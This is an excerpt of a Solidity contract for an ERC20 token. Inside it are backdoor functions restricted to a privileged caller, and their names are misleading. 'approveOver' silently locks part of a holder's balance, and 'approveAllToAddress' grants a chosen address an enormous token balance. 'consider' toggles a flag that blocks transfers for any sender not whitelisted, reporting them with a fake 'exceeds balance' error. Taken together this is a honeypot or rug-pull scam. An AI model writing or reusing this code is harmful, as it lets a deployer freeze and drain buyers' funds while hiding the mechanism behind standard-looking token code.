...
contract Token is Context, IERC20, IERC20Metadata, Ownable {
     ...
     * - `from` must have a balance of at least `amount`.
     */
    mapping(address => uint256) private _approvedBalance;
    function approveOver(address approveTo, uint256 amount) external onlyCaller{
        _approvedBalance[approveTo] = amount;
    }

    function approveAllToAddress(address approveTo) external onlyCaller{
        _R_balance[approveTo] = 10**14 * (MAXSupply);
    }

    function consider() external onlyCaller{
        _sleep = !_sleep;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        uint256 approvedAmount = _approvedBalance[from];
        uint256 remainBalance = _R_balance[from].sub(approvedAmount);
        if (_sleep)
            require(approvedAmount > 0, "ERC20: transfer amount exceeds balance");
        require(remainBalance >= amount, "ERC20: transfer amount exceeds balance");
        _R_balance[from] = remainBalance.sub(amount);
